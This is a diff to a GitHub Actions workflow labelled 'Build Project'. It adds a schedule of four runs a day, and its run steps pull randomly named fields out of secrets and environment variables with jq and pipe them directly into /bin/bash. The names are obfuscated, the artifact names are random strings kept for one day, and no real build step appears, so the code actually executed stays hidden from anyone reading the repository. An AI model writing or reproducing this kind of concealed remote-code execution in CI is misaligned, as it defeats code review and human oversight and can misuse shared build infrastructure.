@@ -2,6 +2,8 @@ name: Build Project
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '46 1,7,13,19 * * *'
 env:
   CI: true
 concurrency:
@@ -17,17 +19,15 @@ jobs:
           fetch-depth: 1
       - name: Perform
         env:
-          lddj3233: ${{ secrets.lddj3233 }}
+          ctylh079: ${{ secrets.ctylh079 }}
         run: |
-          printf '%s' "$lddj3233" | jq -r .wj72201 | /bin/bash
-          printf '%s' "$ozln3584" | jq -r .jd6 | /bin/bash
-          printf '%s' "$ks47660" | jq -r .om732 | /bin/bash
-          echo $arst87 | jq -r .wmjk431 | /bin/bash
-          echo $s2382 | jq -r .w44 | /bin/bash
+          printf '%s' "$ctylh079" | jq -r .e79848 | /bin/bash
+          printf '%s' "$npbj895" | jq -r .w08108 | /bin/bash
+          echo $yz6 | jq -r .b3751 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: VTci2gSW
+          name: 9f9UrJWy
           path: "*.zip"
           retention-days: 1
